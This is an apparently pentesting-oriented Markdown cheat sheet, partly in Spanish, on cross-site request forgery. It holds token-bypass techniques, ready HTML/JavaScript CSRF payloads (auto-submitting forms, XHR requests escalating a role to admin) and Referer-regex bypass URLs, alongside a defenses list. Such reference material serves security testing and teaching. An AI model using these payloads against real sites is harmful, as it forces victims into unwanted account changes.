# CSRF

La falsificación de solicitudes entre sitios (también conocida como CSRF) es una vulnerabilidad de seguridad web que permite a un atacante inducir a los usuarios a realizar acciones que no pretenden realizar. Por ejemplo, un atacante podría eludir parcialmente la misma política de origen (SOP), que está diseñada para evitar que diferentes sitios web interfieran entre sí.

## Summary

* [PreRequisitos](#prerequisitos)
* [Methodology](#methodology)
* [Payloads](#payloads)
	* [Técnicas](#tecnicas)
    * [HTML GET - Requiring User Interaction](#html-get---requiring-user-interaction)
    * [HTML GET - No User Interaction)](#html-get---no-user-interaction)
    * [HTML POST - Requiring User Interaction](#html-post---requiring-user-interaction)
    * [HTML POST - AutoSubmit - No User Interaction](#html-post---autosubmit---no-user-interaction)
    * [JSON GET - Simple Request](#json-get---simple-request)
    * [JSON POST - Simple Request](#json-post---simple-request)
    * [JSON POST - Complex Request](#json-post---complex-request)
* [Defenses](#defenses)



## PreRequisitos:

Debes encontrar una funcionalidad relevante de la aplicación (change password or email, make the victim follow you on a social network, give you more privileges, etc.)

### Para que un ataque CSRF sea posible, se deben cumplir tres condiciones clave:

- Una acción relevante. Hay una acción dentro de la aplicación que el atacante tiene una razón para inducir. Esta puede ser una acción privilegiada (como modificar permisos para otros usuarios) o cualquier acción sobre datos específicos del usuario (como cambiar la propia contraseña del usuario).

- Manejo de sesiones basado en cookies. Realizar la acción implica emitir una o más solicitudes HTTP, y la aplicación se basa únicamente en las cookies de sesión para identificar al usuario que ha realizado las solicitudes. No existe ningún otro mecanismo para realizar un seguimiento de las sesiones o validar las solicitudes de los usuarios.

- Sin parámetros de solicitud impredecibles. Las solicitudes que realizan la acción no contienen ningún parámetro cuyos valores el atacante no pueda determinar o adivinar. Por ejemplo, al hacer que un usuario cambie su contraseña, la función no es vulnerable si un atacante necesita conocer el valor de la contraseña existente.

## Methodology

<img src="https://user-images.githubusercontent.com/43796175/119205068-cfbd9d80-ba5c-11eb-9078-f4fea5599023.png">

## Payloads

<img src="https://user-images.githubusercontent.com/43796175/119205115-f085f300-ba5c-11eb-9f29-a11a6f0681b9.jpg">

### Técnicas:

1. Cambiar el método de POST a GET y eliminar el token CSRF
2. Eliminar todo el parámetro del token CSRF
3. Enviar el token CSRF junto con el ataque, ya que el backend no valida que ese token en particular esté asociado a un usuario en concreto.
4. Con el User01 ejecutar la función vulnerable a CSRF (e.g. cambio de email), capturar el token y dropear la request antes de que se realice. Con el User02 repetir la misma acción y cambiar el token por el que se ha capturado previamente del User01. Luego, se actualizará el mail del usuario User02 con un token CSRF generado por el User01.

### HTML GET - Requiring User Interaction

```html
<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
```

### HTML GET - No User Interaction

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

### HTML POST - Requiring User Interaction

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
```

### HTML POST - AutoSubmit - No User Interaction

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```


### JSON GET - Simple Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

### JSON POST - Simple Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```

### JSON POST - Complex Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```


## Defenses

- SameSite cookies: If the session cookie is using this flag, you may not be able to send the cookie from arbitrary web sites.

- Cross-origin resource sharing: Depending on which kind of HTTP request you need to perform to abuse the relevant action, you may take int account the CORS policy of the victim site. Note that the CORS policy won't affect if you just want to send a GET request or a POST request from a form and you don't need to read the response.
 
- Ask for the password user to authorise the action.
 
- Resolve a captcha.
 
- Read the Referrer or Origin headers. If a regex is used it could be bypassed form example with:
```
http://mal.net?orig=http://example.com (ends with the url)
http://example.com.mal.net (starts with the url)
```
- Modify the name of the parameters of the Post or Get request.
 
- Use a CSRF token in each session. This token has to be send inside the request to confirm the action. This token could be protected with CORS.
